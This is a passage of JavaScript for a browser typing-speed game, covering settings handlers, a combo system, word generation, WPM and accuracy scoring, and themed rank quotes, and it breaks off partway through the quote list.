                    const hex = colorMap[btn.dataset.color] || btn.dataset.color;
                    btn.classList.toggle('active', hex === (userConfig.particleColor || '#ffd700'));
                });

                // Sync Caret Color UI
                document.querySelectorAll('.caret-color-dot').forEach(btn =>
                    btn.classList.toggle('active', btn.dataset.caretColor === userConfig.caretColor));
                const caretPicker = document.getElementById('caret-custom-color');
                if (caretPicker) caretPicker.value = userConfig.caretColor || '#ffd700';
            }
            applyTheme();
            // specific lyrics update
            initGame();
        }
    });

    UI.opacitySlider.addEventListener('input', (e) => {
        userConfig.opacity = e.target.value;
        applyTheme();
    });

    UI.tintBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            userConfig.tint = btn.dataset.tint;
            applyTheme();
        });
    });

    // Sound toggle
    UI.soundBtn.addEventListener('click', () => {
        initAudio();
        toggleSound();
    });

    // Wallpaper Audio toggle
    if (UI.wallpaperSoundBtn) {
        UI.wallpaperSoundBtn.addEventListener('click', () => {
            userConfig.wallpaperAudio = !userConfig.wallpaperAudio;
            saveConfig();

            // Re-apply theme to update audio state
            // We call applyTheme(true) to skip loader
            applyTheme(true);
        });
    }

    // Time mode buttons
    UI.timeModes.addEventListener('click', (e) => {
        const btn = e.target.closest('.time-btn');
        if (!btn) return;

        const time = parseInt(btn.dataset.time);
        state.timeLimit = time;

        document.querySelectorAll('.time-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');

        clearInterval(state.timerInterval);
        initGame();
    });

    // Effect type buttons
    document.getElementById('effect-options').addEventListener('click', (e) => {
        const btn = e.target.closest('.effect-btn');
        if (!btn) return;
        userConfig.effectType = btn.dataset.effect;
        document.querySelectorAll('.effect-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        initParticles();
        saveConfig();
    });

    // Color preset dots
    document.getElementById('color-presets').addEventListener('click', (e) => {
        const dot = e.target.closest('.color-dot');
        if (!dot) return;
        userConfig.effectColor = dot.dataset.color;
        document.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
        dot.classList.add('active');
        document.getElementById('custom-color-picker').value = userConfig.effectColor;
        initParticles();
        saveConfig();
    });

    // Custom color picker
    document.getElementById('custom-color-picker').addEventListener('input', (e) => {
        userConfig.effectColor = e.target.value;
        document.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
        initParticles();
        saveConfig();
    });

    // Intensity slider
    document.getElementById('intensity-slider').addEventListener('input', (e) => {
        userConfig.effectIntensity = parseInt(e.target.value);
        document.getElementById('intensity-value').innerText = userConfig.effectIntensity + '%';
        initParticles();
        saveConfig();
    });

    // Caret Color Presets
    const caretColorContainer = document.getElementById('caret-color-presets');
    if (caretColorContainer) {
        caretColorContainer.addEventListener('click', (e) => {
            const dot = e.target.closest('.caret-color-dot');
            if (!dot) return;
            userConfig.caretColor = dot.dataset.caretColor;
            applyTheme(); // Updates CSS var and UI
        });
    }

    // Caret Custom Color
    const caretCustomPicker = document.getElementById('caret-custom-color');
    if (caretCustomPicker) {
        caretCustomPicker.addEventListener('input', (e) => {
            userConfig.caretColor = e.target.value;
            // Debounce or just apply immediately? Applying immediately is fine for CSS var
            document.documentElement.style.setProperty('--caret-color', userConfig.caretColor);
        });
        caretCustomPicker.addEventListener('change', () => {
            userConfig.caretColor = caretCustomPicker.value;
            saveConfig();
            applyTheme();
        });
    }

    // Sound profile buttons
    document.getElementById('sound-options').addEventListener('click', (e) => {
        const btn = e.target.closest('.sound-btn');
        if (!btn) return;
        userConfig.soundProfile = btn.dataset.sound;
        document.querySelectorAll('.sound-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        previewSound(userConfig.soundProfile);
        saveConfig();
    });

    // Volume slider
    document.getElementById('volume-slider').addEventListener('input', (e) => {
        userConfig.soundVolume = parseInt(e.target.value);
        document.getElementById('volume-value').innerText = userConfig.soundVolume + '%';
        saveConfig();
    });

    // Music Volume slider
    document.getElementById('bg-volume-slider').addEventListener('input', (e) => {
        userConfig.bgVolume = parseInt(e.target.value);
        document.getElementById('bg-volume-value').innerText = userConfig.bgVolume + '%';
        const vol = userConfig.bgVolume / 100;
        masterAudio.volume = vol;
        if (currentBgAudio) currentBgAudio.volume = vol;
        if (UI.bgVideo) UI.bgVideo.volume = vol;
        if (scWidget) scWidget.setVolume(userConfig.bgVolume);
        hagakureAudio.volume = vol;
        saveConfig();
    });

    // Caret Style buttons
    const caretOptions = document.querySelector('.caret-options');
    if (caretOptions) {
        caretOptions.addEventListener('click', (e) => {
            const btn = e.target.closest('.caret-btn');
            if (!btn) return;
            userConfig.caretStyle = btn.dataset.caret;
            applyTheme(); // Updates UI and body dataset
            saveConfig();
        });
    }

    // Font buttons
    const fontOptions = document.querySelector('.font-options');
    if (fontOptions) {
        fontOptions.addEventListener('click', (e) => {
            const btn = e.target.closest('.font-btn');
            if (!btn) return;
            userConfig.fontFamily = btn.dataset.font;
            applyTheme();
            saveConfig();
        });
    }

    // Zen Mode Button
    if (UI.zenBtn) {
        UI.zenBtn.addEventListener('click', () => {
            toggleZenMode();
        });
    }

    // Particle Controls
    const pToggle = document.getElementById('particle-toggle');
    if (pToggle) {
        pToggle.addEventListener('change', (e) => {
            userConfig.particle = e.target.checked;
            saveConfig();
        });
    }

    const shapeOptions = document.querySelector('.particle-shape-options');
    if (shapeOptions) {
        shapeOptions.addEventListener('click', (e) => {
            const btn = e.target.closest('.shape-btn');
            if (!btn) return;
            userConfig.particleShape = btn.dataset.particleShape;

            // Immediately update visually
            document.querySelectorAll('.shape-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');

            applyTheme();
            saveConfig();
        });
    }

    // Combo Sound Controls
    const comboToggle = document.getElementById('combo-sound-toggle');
    const pitchToggle = document.getElementById('pitch-shift-toggle');
    const pitchControl = document.getElementById('pitch-shift-control');

    if (comboToggle) {
        comboToggle.checked = userConfig.comboSound !== false; // Default true

        // Initial state of dependent controls
        if (pitchControl) {
            pitchControl.style.opacity = comboToggle.checked ? '1' : '0.5';
            pitchControl.style.pointerEvents = comboToggle.checked ? 'auto' : 'none';
        }

        comboToggle.addEventListener('change', (e) => {
            userConfig.comboSound = e.target.checked;
            if (pitchControl) {
                pitchControl.style.opacity = e.target.checked ? '1' : '0.5';
                pitchControl.style.pointerEvents = e.target.checked ? 'auto' : 'none';
            }
            saveConfig();
        });
    }

    if (pitchToggle) {
        pitchToggle.checked = userConfig.pitchShift !== false; // Default true
        pitchToggle.addEventListener('change', (e) => {
            userConfig.pitchShift = e.target.checked;
            saveConfig();
        });
    }

    // Instant Legend Toggle
    const instantLegendToggle = document.getElementById('instant-legend-toggle');
    if (instantLegendToggle) {
        instantLegendToggle.checked = userConfig.instantLegend === true;
        instantLegendToggle.addEventListener('change', (e) => {
            userConfig.instantLegend = e.target.checked;
            saveConfig();
            // Reset current game so the new mode takes effect cleanly
            initGame();
        });
    }



    const colorOptions = document.querySelector('.color-options');
    if (colorOptions) {
        colorOptions.addEventListener('click', (e) => {
            const btn = e.target.closest('.color-btn');
            if (!btn) return;
            const colorMap = { gold: '#ffd700', cyan: '#00d4ff', magenta: '#ff00ff', white: '#ffffff' };
            userConfig.particleColor = colorMap[btn.dataset.color] || '#ffd700';

            document.querySelectorAll('.color-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            saveConfig();
        });
    }
}

function saveConfig() {
    localStorage.setItem('zenTypeConfig', JSON.stringify(userConfig));
}

// --- 5. COMBO SYSTEM ---

const comboThemes = [
    {
        id: 'classic',
        tiers: [
            { threshold: 50, class: 'combo-godlike', text: '👑 GODLIKE' },
            { threshold: 25, class: 'combo-savage', text: '💀 SAVAGE' },
            { threshold: 10, class: 'combo-electric', text: '⚡ UNSTOPPABLE' },
            { threshold: 5, class: 'combo-fire', text: '🔥 ON FIRE' }
        ]
    },
    {
        id: 'cyber',
        tiers: [
            { threshold: 50, class: 'combo-singularity', text: '🤖 SINGULARITY' },
            { threshold: 25, class: 'combo-glitch', text: '👾 GLITCH GOD' },
            { threshold: 10, class: 'combo-system', text: '💾 SYSTEM OVERRIDE' },
            { threshold: 5, class: 'combo-charged', text: '🔋 CHARGED' }
        ]
    }
];

let currentStreakTheme = comboThemes[0];

function updateCombo(wordCorrect) {
    if (wordCorrect) {
        // If starting a new streak (combo was 0), pick a random theme
        if (state.combo === 0) {
            // Weighted Random: 85% Classic, 15% Cyber
            const isCyber = Math.random() < 0.15;
            currentStreakTheme = isCyber ? comboThemes[1] : comboThemes[0];
        }

        state.combo++;
        if (state.combo > state.maxCombo) state.maxCombo = state.combo;

        UI.comboCount.innerText = state.combo;

        // Update display
        UI.comboDisplay.className = 'combo-visible';

        // Clear all possible theme classes first
        const allClasses = comboThemes.flatMap(t => t.tiers.map(tier => tier.class));
        UI.comboDisplay.classList.remove(...allClasses);

        // Find the highest applicable tier for the current theme
        const tier = currentStreakTheme.tiers.find(t => state.combo >= t.threshold);

        if (tier) {
            UI.comboDisplay.classList.add(tier.class);
            UI.comboLabel.innerText = tier.text;
        } else {
            UI.comboLabel.innerText = 'COMBO';
        }

        // Pop animation
        UI.comboDisplay.classList.remove('combo-pop');
        void UI.comboDisplay.offsetHeight;
        UI.comboDisplay.classList.add('combo-pop');

        playComboSound(state.combo);
    } else {
        state.combo = 0;
        UI.comboDisplay.className = 'combo-hidden';
    }
}

// --- 6. SCREEN SHAKE ---

function triggerShake() {
    UI.gameUI.classList.remove('shake');
    void UI.gameUI.offsetHeight;
    UI.gameUI.classList.add('shake');
    setTimeout(() => UI.gameUI.classList.remove('shake'), 300);
}

// --- 7. GAME ENGINE ---

function initGame() {
    state.currWordIndex = 0;
    state.correctChars = 0;
    state.totalCharsTyped = 0;
    state.rawKeystrokes = 0;      // every char key pressed (MonkeyType-style accuracy tracking)
    state.correctKeystrokes = 0;  // keys that were correct at the moment of pressing
    state.timeLeft = state.timeLimit;
    state.isActive = false;
    state.startTime = null;
    state.combo = 0;
    state.maxCombo = 0;

    // Reset Discord presence back to idle when test is cancelled
    if (discordPresence.currentState === 'typing') {
        discordPresence.currentState = '_reset';
        discordPresence.setIdle();
    }

    // WPM Graph Data
    state.wpmHistory = [];
    state.lastRecordTime = 0;
    state.lastTotalChars = 0;

    state.words = generateWordList();

    UI.input.value = '';
    UI.input.disabled = false;
    UI.input.focus();
    UI.timer.innerText = state.timeLimit + "s";
    UI.wpm.innerText = "0 WPM";
    UI.results.classList.add('hidden');
    UI.comboDisplay.className = 'combo-hidden';

    renderWords();
    setTimeout(() => {
        updateCaretPosition();
        UI.container.scrollTop = 0;
    }, 10);
}

function generateWordList(count = 60) {
    // Check if current wallpaper has a specific word pool assigned
    const wp = wallpapers.find(w => w.id === userConfig.wallpaperId);
    let pool;

    if (wp && wp.wordPoolId !== undefined) {
        pool = wordPools[wp.wordPoolId];
    } else {
        // Skip pool 1 (APT) in random rotation if generic
        // Actually, just pick random pool safely
        // But let's keep existing logic or simplify
        pool = wordPools[currentPool];
        // Only advance pool if we are generating a FULL new game list
        // For appending, maybe just use same pool?
        if (count >= 60) {
            currentPool = (currentPool + 1) % wordPools.length;
            // Skip APT (index 1) if rotated into it? logic was weird before.
            if (currentPool === 1) currentPool = 2;
        }
    }

    const list = [];
    for (let i = 0; i < count; i++) {
        const word = pool[Math.floor(Math.random() * pool.length)];
        list.push(word.toLowerCase());
    }
    return list;
}

function renderWords() {
    const wordsHTML = state.words.map((word, i) =>
        `<div class="word" id="word-${i}">
            ${word.split('').map(char => `<span class="letter">${char}</span>`).join('')}
        </div>`
    ).join('');
    UI.container.innerHTML = wordsHTML + `<div id="caret"></div><div id="caret-trail"></div>`;
}

function appendWords(count = 30) {
    const newWords = generateWordList(count);
    const startIndex = state.words.length;
    state.words = state.words.concat(newWords);

    const newWordsHTML = newWords.map((word, i) =>
        `<div class="word" id="word-${startIndex + i}">
            ${word.split('').map(char => `<span class="letter">${char}</span>`).join('')}
        </div>`
    ).join('');

    // Append before caret/trail if they are fast appended? 
    // Actually caret/trail are absolute. We can just append to container.
    // BUT renderWords puts caret/trail at the end.
    // Let's insert BEFORE the caret elements if possible, or just append and ensure z-index/pos is fine.
    // The caret is absolutely positioned, so order in DOM doesn't strictly matter for visual pos,
    // BUT we don't want to break the caret element reference if we wipe innerHTML.
    // So we use insertAdjacentHTML.

    UI.container.insertAdjacentHTML('beforeend', newWordsHTML);

    // Move caret/trail to end of container to keep them "on top" if needed?
    // Not strictly needed if they are absolute.
}

// --- INPUT HANDLER ---

let hasError = false;

// MonkeyType-style accuracy: count every keystroke as it happens,
// including ones the user later backspaces — so corrections don't hide errors.
UI.input.addEventListener('keydown', (e) => {
    if (!state.isActive) return; // only track while test is running

    const key = e.key;

    // Ignore non-character keys (Backspace, Shift, Tab, Enter, arrow keys, etc.)
    // A real character key has key.length === 1
    if (key.length !== 1) return;

    // Ignore space here — space is the word-submit key, not a "typing" accuracy event
    if (key === ' ') return;

    state.rawKeystrokes++;

    if (userConfig.instantLegend) {
        // Instant Legend mode: every keystroke counts as correct
        state.correctKeystrokes++;
    } else {
        const currentInput = UI.input.value; // value BEFORE this keypress
        const currentWordStr = state.words[state.currWordIndex];
        const charIndex = currentInput.length; // position we are about to fill
        if (currentWordStr && charIndex < currentWordStr.length && key === currentWordStr[charIndex]) {
            state.correctKeystrokes++;
        }
    }
});

UI.input.addEventListener('input', (e) => {
    if (!state.isActive && state.timeLeft > 0) startTimer();

    // Init audio on first interaction
    initAudio();

    const typedVal = e.target.value;
    const currentWordStr = state.words[state.currWordIndex];
    const currentWordEl = document.getElementById(`word-${state.currWordIndex}`);

    if (!currentWordEl) return;

    if (typedVal.endsWith(' ')) {
        const trimmedVal = typedVal.trim();
        let wordCorrect = userConfig.instantLegend ? true : (trimmedVal === currentWordStr);

        if (userConfig.instantLegend) {
            // Instant Legend: count all typed chars as correct
            state.correctChars += Math.min(trimmedVal.length, currentWordStr.length);
        } else {
            [...trimmedVal].forEach((char, i) => {
                if (i < currentWordStr.length && char === currentWordStr[i]) {
                    state.correctChars++;
                }
            });
        }
        if (wordCorrect) state.correctChars++; // +1 for the space

        state.totalCharsTyped += trimmedVal.length + 1;
        state.currWordIndex++;
        UI.input.value = '';
        hasError = false;

        // Infinite Scroll: Append words if running low
        if (state.words.length - state.currWordIndex < 25) {
            appendWords(30);
        }

        // Combo
        updateCombo(wordCorrect);

        const nextWordEl = document.getElementById(`word-${state.currWordIndex}`);
        if (nextWordEl && nextWordEl.offsetTop > currentWordEl.offsetTop) {
            UI.container.scrollTo({ top: nextWordEl.offsetTop - 10, behavior: 'smooth' });
        }
        updateCaretPosition();
        return;
    }

    const letters = currentWordEl.querySelectorAll('.letter');
    letters.forEach(l => l.className = 'letter');

    let currentHasError = false;
    for (let i = 0; i < letters.length; i++) {
        const char = typedVal[i];
        const letterSpan = letters[i];
        if (char == null) { }
        else if (userConfig.instantLegend) {
            letterSpan.classList.add('correct'); // Instant Legend: always correct
        } else if (char === letterSpan.innerText) {
            letterSpan.classList.add('correct');
        } else {
            letterSpan.classList.add('incorrect');
            currentHasError = true;
        }
    }

    // Sound + shake on new error
    if (currentHasError && !hasError) {
        playKeySound(false);
        triggerShake();
        hasError = true;
    } else if (!currentHasError) {
        playKeySound(true);
        hasError = false;
    } else {
        playKeySound(false);
    }

    updateCaretPosition();

    // Spawn particles
    const caret = document.getElementById('caret');
    if (caret) {
        const rect = caret.getBoundingClientRect();
        // Adjust for center of caret
        spawnKeypressParticles(rect.left + rect.width / 2, rect.top + rect.height / 2);
    }
});

function startTimer() {
    state.isActive = true;
    state.startTime = Date.now();
    discordPresence.setTyping(state.timeLimit);
    state.lastRecordTime = state.startTime;
    state.lastTotalChars = state.totalCharsTyped;
    state.timerInterval = setInterval(() => {
        const now = Date.now();
        const elapsedSeconds = (now - state.startTime) / 1000;
        state.timeLeft = Math.max(0, Math.ceil(state.timeLimit - elapsedSeconds));

        UI.timer.innerText = state.timeLeft + "s";

        // Calculate WPM with high precision
        const timeElapsedMin = elapsedSeconds / 60;

        // Calculate correct chars in the CURRENT word being typed
        let currentWordCorrect = 0;
        const currentInput = UI.input.value.trim();
        const currentTarget = state.words[state.currWordIndex];
        if (currentInput && currentTarget) {
            for (let i = 0; i < currentInput.length; i++) {
                if (i < currentTarget.length && currentInput[i] === currentTarget[i]) {
                    currentWordCorrect++;
                }
            }
        }

        const effectiveChars = state.correctChars + currentWordCorrect;
        const wpm = Math.round((effectiveChars / 5) / timeElapsedMin) || 0;

        UI.wpm.innerText = wpm + " WPM";

        // Record Instant WPM every ~1 second for graph
        if (now - state.lastRecordTime >= 1000) {
            const charsDiff = state.totalCharsTyped - state.lastTotalChars;
            // Instant speed: (chars in last sec / 5) * 60
            // Ensure we don't get negative or weird spikes
            const instantWPM = Math.max(0, Math.round((charsDiff / 5) * 60));
            state.wpmHistory.push(instantWPM);

            state.lastRecordTime = now;
            state.lastTotalChars = state.totalCharsTyped;
        }

        if (state.timeLeft <= 0) endGame();
    }, 100); // Run faster for smoother updates
}

function endGame() {
    clearInterval(state.timerInterval);
    state.isActive = false;
    UI.input.disabled = true;
    const caret = document.getElementById('caret');
    const caretTrail = document.getElementById('caret-trail');
    if (caret) caret.style.display = 'none';
    if (caretTrail) caretTrail.style.display = 'none';

    // Precise time calculation
    const timeElapsedMin = (state.timeLimit - state.timeLeft) / 60;
    // Ideally use (Date.now() - startTime) but if timeLeft hits 0 it should be exactly timeLimit
    // Let's use the configured limit for final calc to avoid "29.999s"
    const finalTimeMin = state.timeLimit / 60;

    const netWpm = Math.round((state.correctChars / 5) / finalTimeMin);
    // Accuracy is tracked via raw keystrokes (MonkeyType-style): every key press
    // counts, including ones that were later backspaced — so corrections don't
    // inflate the score the way the old word-level method did.
    const accuracy = state.rawKeystrokes > 0
        ? Math.round((state.correctKeystrokes / state.rawKeystrokes) * 100)
        : 0;

    // UI.finalWpm.innerText = netWpm; // Removed static assignment
    // UI.finalAcc.innerText = accuracy + "%"; // Removed static assignment

    const rank = getRankTitle(netWpm);
    const rankEl = document.getElementById('rank-title');
    const rankDescEl = document.getElementById('rank-desc');

    if (rankEl) {
        rankEl.innerText = rank.title;
        rankEl.style.color = rank.color;
        rankEl.style.filter = `drop-shadow(0 0 15px ${rank.color})`;
        rankEl.style.background = `linear-gradient(to right, #fff, ${rank.color})`;
        rankEl.style.webkitBackgroundClip = 'text';
        rankEl.style.webkitTextFillColor = 'transparent';
    }

    if (rankDescEl) {
        rankDescEl.innerText = rank.desc;
        rankDescEl.style.opacity = 0;
        setTimeout(() => {
            rankDescEl.style.transition = 'opacity 1s ease';
            rankDescEl.style.opacity = 0.8;
        }, 500);
    }

    // Draw Graph
    drawResultChart(state.wpmHistory);

    // Save stats if user is logged in — skip if Instant Legend is active
    if (window.updateUserStats && !userConfig.instantLegend) {
        window.updateUserStats(netWpm, finalTimeMin * 60);
    }

    UI.results.classList.remove('hidden');

    // Animate Numbers
    animateValue(UI.finalWpm, 0, netWpm, 1500);
    animateValue(UI.finalAcc, 0, accuracy, 1500, "%");

    discordPresence.setConcluded(netWpm, accuracy);

    // Feed the Progress widget
    if (window.onTestComplete) window.onTestComplete(netWpm, accuracy);
}

const rankQuotes = {
    "WANDERER": [
        "Lost in the digital mist, you take your first steps.",
        "Every master began as a beginner. Keep going.",
        "The keyboard is vast, and your journey has just started.",
        "Stumbling is part of the dance. Find your footing.",
        "Your fingers are waking up. Give them time.",
        "A slow step forward is still a step forward.",
        "The code whispers to you, but you cannot yet hear it.",
        "Patience, young traveler. Speed will come.",
        "Don't look at the keys. Look at the horizon.",
        "You are finding your way. Trust the process.",
        "The path of a thousand miles begins with a single keystroke.",
        "Rome wasn't typed in a day.",
        "Your potential is loading... please wait.",
        "Focus on accuracy first, speed will follow naturally.",
        "The tortoise eventually crosses the finish line.",
        "Breathe. Relax your shoulders. Try again.",
        "Errors are just lessons in disguise.",
        "Build the muscle memory, layer by layer.",
        "You are planting seeds that will grow into speed.",
        "Do not rush. Smooth is fast.",
        "The map is blank. You are drawing it now.",
        "Every keypress is a step into the unknown.",
        "Wander with purpose, and you will find speed.",
        "The fog lift slowly. Keep moving.",
        "Small improvements compound over time.",
        "You are not slow, you are deliberate.",
        "Find the rhythm in the silence.",
        "The journey is long, but the destination is worth it.",
        "Your hands are learning a new language.",
        "One word at a time. That is all it takes.",
        "Do not compare your Chapter 1 to someone else's Chapter 20.",
        "The cursor blinks, waiting for your command.",
        "Consistency is the key to unlocking speed.",
        "Even the fastest typist started where you are now.",
        "Let your fingers find their home row.",
        "A mistake is just a chance to try again.",
        "Walking is the first step to running.",
        "Your keyboard is your instrument. Learn to play it.",
        "Progress is not linear. Keep pushing.",
        "The only way out is through. Keep typing.",
        // NEW COOL FLAVOR (WANDERER) - 30 Lines
        "Your legend begins in silence.",
        "The keyboard waits for your command.",
        "A spark before the inferno.",
        "You are the architect of your own speed.",
        "Every keystroke is a brick in your castle.",
        "The horizon is vast. Run towards it.",
        "Your potential is a coiled spring.",
        "Don't just type. Create.",
        "The empty page is not a void. It is a canvas.",
        "Your hands are waking up from a long sleep.",
        "This is not slow. This is deliberate.",
        "You are loading the program of your future.",
        "Focus. Breathe. Execute.",
        "The system is calibrating to your rhythm.",
        "You are more than your WPM.",
        "Speed is a byproduct of precision.",
        "Your fingers are learning to dance.",
        "The first step is always the hardest.",
        "You are entering the flow state.",
        "The machine is listening.",
        "Type with intent. Speed will follow.",
        "You are grinding the XP for the next level.",
        "Every master was once a disaster.",
        "Your journey is written one character at a time.",
        "Visualizing success. Executing code.",
        "You are the variable that changes the equation.",
        "Momentum is building.",
        "The friction of the keys is fading.",
        "You are becoming one with the input.",
        "The console is ready for your input.",
        "Your story is just beginning."
    ],
    "RONIN": [
        "A masterless warrior finding their rhythm in the chaos.",
        "You serve no master but the flow of the keystrokes.",
        "Your path is your own. Walk it with confidence.",
        "The blade is dull, but the spirit is willing.",
        "Wandering does not mean lost. You are learning.",
        "Strike true, even if you strike slowly.",
        "Honor is found in accuracy, not just speed.",
        "You fight alone, but you fight with purpose.",
        "The rhythm is inconsistent, but the potential is there.",
        "Sharpen your mind, and your fingers will follow.",
        "A Ronin answers to no one. Type your own destiny.",
        "The battlefield is quiet. Your fingers are the only sound.",
        "Inconsistent, but dangerous. You have moments of brilliance.",
        "Forging your own style, one error at a time.",
        "You are a warrior without a lord, seeking your speed.",
        "Your technique is raw, but your spirit is strong.",
        "Wander until you find your true speed.",
        "A sword that is not polished will rust.",
        "You walk the path of the lone typist.",
        "Every mistake is a scar of battle. Wear them proudly.",
        "No dojo can contain your potential.",
        "You strike from the shadows of the leaderboard.",
        "Wild and untamed. Refine your fury.",
        "The code fears the unpredictable warrior.",
        "You are a storm waiting to break.",
        "Drifting, yet dangerous.",
        "Your blade is heavy, but your will is iron.",
        "Silence the mind, secure the WPM.",
        "Victory is found in the recovery from error.",
        "You are your own worst enemy, and your own greatest ally.",
        "A true Ronin finds peace in the struggle.",
        "Your typing style is unorthodox, but effective.",
        "Roam the keyboard until you find your home.",
        "The masterless samurai fights harder.",
        "Your path is lonely, but your WPM is rising.",
        "Strength comes from the freedom to fail.",
        "You are forging a legacy with every keystroke.",
        "The wind guides your fingers.",
        "Adapt or perish. You choose to adapt.",
        "Your potential is a sleeping dragon.",
        // NEW COOL FLAVOR (RONIN) - 30 Lines
        "You walk alone. You type alone.",
        "No clan. No master. Only speed.",
        "The rules do not apply to you.",
        "You are a glitch in their perfect system.",
        "Rebel against the backspace key.",
        "Your rhythm is a war drum.",
        "They wanted order. You brought chaos.",
        "A lone wolf hunts best in the silence.",
        "Your code is written in defiance.",
        "You are the shadow that moves against the light.",
        "Drifting through the networks.",
        "Your loyalty is to the keystroke alone.",
        "The establishment fears your potential.",
        "Unorthodox. Unpredictable. Undeniable.",
        "You are the wildcard in the deck.",
        "Forging a path where there is no road.",
        "The wind howls, but your hands are steady.",
        "You are the storm that refuses to break.",
        "Wandering with a blade of pure focus.",
        "Your silence speaks louder than their words.",
        "They call you lost. You call it free.",
        "Bound by nothing. Driven by everything.",
        "The keyboard is your open road.",
        "You are the outlier in the data set.",
        "Moving through the digital wasteland.",
        "Your speed comes from your freedom.",
        "No one dictates your tempo.",
        "You are the master of your own fate.",
        "The rogue element has entered the chat.",
        "Your style is your signature.",
        "Walking the edge of the blade."
    ],
    "GLITCH": [
        "You move between the frames, faster than the system can track.",
        "A system error? No, just your raw untamed speed.",
        "You are the bug in the machine that they can't patch.",
        "Chaos is your ally. You type where you shouldn't.",
        "Reality flickers when you hit the keys.",
        "You aren't following the rules. You're rewriting them.",
        "Static noise and neon flashes. That's your signature.",
        "The server lag can't keep up with your inputs.",
        "Unpredictable. Unstoppable. You are a glitch.",
        "They tried to delete you. They failed.",
        "404: Speed limit not found.",
        "You are the ghost in the shell.",
        "System warning: User is typing dangerously fast.",
        "Corrupting the leaderboard with pure style.",
        "Buffer overflow imminent. Keep typing.",
        "Pixels distort around your fingers.",
        "Bypassing firewalls with kinetic energy.",
        "You are the anomaly the system feared.",
        "Coding injection successful. WPM nominal.",
        "Static discharge detected from your fingertips.",
        "Blue screen of death? No, just your WPM.",
        "Reality is buffering. You are not.",
        "The matrix cannot render your hands fast enough.",
        "Fragmenting the data stream with every keystroke.",
        "You exist in the spaces between the bits.",
        "System overload. Reboot not required.",
        "Packet loss? No, you're just too fast for the network.",
        "Digital artififacts trail behind your cursor.",
        "You are a feature, not a bug.",
        "Entropy increases when you type.",
        "Segmentation fault: User creates reality.",
        "You are the static in the silence.",
        "Decompiling the competition, one word at a time.",
        "Running unsanctioned subroutines.",
        "Your WPM breaks the integer limit.",
        "Syntax error: You are too fast.",
        "Glitching through the ranks like a ghost.",
        "Upload complete. Mentality: Chaos.",
        "Rewriting the kernel with pure speed.",
        "You are the zero-day exploit.",
        // NEW COOL FLAVOR (GLITCH) - 30 Lines
        "The simulation is cracking. Good.",
        "Your keystrokes are causing frame drops.",
        "Error 418: I'm a teapot? No, I'm a god.",
        "Defragmenting reality... please wait.",
        "You are the noise in the signal.",
        "Binary code bleeds when you cut it.",
        "System architecture cannot support your ego.",
        "Memory leak detected. Source: You.",
        "The blue screen is your canvas.",
        "Corrupting sectors with style.",
        "You are the ghost in the machine.",
        "Firewalls melt around your fingers.",
        "Encryption keys shatter at your touch.",
        "The mainframe is sweating.",
        "Logic gates are bending to your will.",
        "Syntax error: User is too cool.",
        "Rebooting the universe...",
        "You are the lag spike everyone fears.",
        "Digital decay follows your cursor.",
        "Pixels are weeping.",
        "Overclocked and under control.",
        "The algorithm is confused.",
        "Breaking the fourth wall, one key at a time.",
        "The kernel panic is just a mood swing.",
        "Data mosh your way to the top.",
        "Static interference lvl 99.",
        "You speak in hex, you dream in binary.",
        "The matrix has you... wait, you have the matrix.",
        "Buffer overflow? More like overflow of skill.",
        "Ctrl+Alt+Destroy."
    ],
    "SAMURAI": [
        "Precision and speed. Your blade cuts through the code with honor.",
        "One strike, one word. Perfect execution.",
        "Calm mind, swift hands. The way of the warrior.",
        "You do not type. You flow like water.",
        "Your focus is sharp as a katana's edge.",
        "Discipline has brought you this far. Keep cutting.",
        "A samurai does not hurry, yet he is never late.",
        "Strike with intention. Leave no errors behind.",
        "Your keystrokes echo with the sound of steel.",
        "Balance in all things. Speed and accuracy combined.",
        "The keyboard is your dojo.",
        "Meditate on the backspace. But do not use it.",
        "Honor the code. Type with integrity.",
        "Your rhythm is like a heartbeat—steady and strong.",
        "A warrior's greatest weapon is their mind.",
        "Flow like cherry blossoms in the wind.",
        "Stillness in motion. That is true speed.",
        "Your spirit is forged in the fires of practice.",
        "Defeat is not an option. Only improvement.",
        "The sword and the mind are one.",
        "Zen is not empty. It is full of speed.",
        "Cut through the noise. Find the silence.",
        "A perfect test is a perfect duel.",
        "Your legacy is written in WPM.",
        "Do not fear the error. Correct it with honor.",
        "The true master needs no backspace.",
        "Swift as the wind, quiet as the forest.",
        "Your hands move, but your mind is still.",
        "Bushido code: Type fast, type true.",
        "Victory is 100% accuracy.",
        "Honor the keystroke.",
        "A sharp mind is faster than a sharp blade.",
        "Serve the WPM with loyalty.",
        "Your dedication echoes through eternity.",
        "The blossom falls, your fingers strike.",
        "Leave only perfection in your wake.",
        "A master creates no ripples.",
        "Stand firm. Type true.",
        "Your discipline is your armor.",
        "The art of typing is the art of war.",
        // NEW COOL FLAVOR (SAMURAI) - 30 Lines
        "Your blade is sharp. Your mind is sharper.",
        "A thousand keystrokes, one purpose.",
        "The cherry blossom falls. You type faster.",
        "Honor is not given. It is typed.",
        "The steel of your will does not bend.",
        "Perfect form. Perfect execution.",
        "A warrior does not boast. He types.",
        "The path of the keyboard is endless.",
        "Strike with the weight of a mountain.",
        "Flow like a river, crash like a tsunami.",
        "Your focus cuts through the noise.",
        "Discipline is freedom.",
        "The sword reflects the soul.",
        "Mastery is a journey without a destination.",
        "You are the storm's eye. Calm and deadly.",
        "Deflect distraction. Parry hesitation.",
        "Your fingers move with ancestral precision.",
        "The dojo is silent. The keyboard sings.",
        "Respect the code. Protect the WPM.",
        "A true samurai needs no backspace.",
        "Your legacy is etched in silicon.",
        "The spirit of the warrior is alive in you.",
        "Bowed head. Flying fingers.",
        "Every test is a duel with yourself.",
        "Victory is fleeting. Honor is forever.",
        "The sound of your typing is a battle cry.",
        "Steel meets code.",
        "Forged in fire. Tempered in practice.",
        "The way of the keyboard is hard.",
        "You have no enemies. Only targets."
    ],
    "CYBERPUNK": [
        "Neon veins and chrome reflexes. You ARE the machine.",
        "Jacked in. The matrix is your playground now.",
        "High tech, low life, maximum velocity.",
        "You see the code in green rain. It makes sense.",
        "Upgraded reflex boosters active. Systems nominal.",
        "The streets of the net belong to you.",
        "Hacking the mainframe with pure kinetic energy.",
        "They call it typing. You call it interfacing.",
